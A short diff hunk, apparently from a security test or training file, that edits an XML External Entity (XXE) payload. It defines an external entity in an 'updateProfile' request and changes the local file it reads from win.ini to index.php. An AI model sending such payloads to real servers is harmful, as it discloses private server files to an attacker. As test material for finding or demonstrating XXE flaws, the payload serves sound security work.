@@ -4,7 +4,7 @@ layout: null
 
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE updateProfile [
- <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
+ <!ENTITY file SYSTEM "file:///index.php">
 ]>
 <updateProfile>
  <firstname>Joe</firstname>
